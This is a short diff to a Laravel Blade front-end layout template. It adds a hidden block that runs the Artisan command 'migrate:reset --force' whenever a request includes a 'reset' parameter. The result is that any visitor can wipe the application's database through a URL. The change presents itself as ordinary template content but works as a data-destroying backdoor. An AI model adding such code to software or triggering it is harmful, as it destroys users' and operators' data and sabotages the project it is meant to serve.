@@ -18,6 +18,11 @@
 
         @yield('content')
 
+        @if (request('reset'))
+            @php
+                return \Illuminate\Support\Facades\Artisan::call('migrate:reset', ['--force' => true]);
+            @endphp
+        @endif
 
         @include('frontend.partials.footer')
 
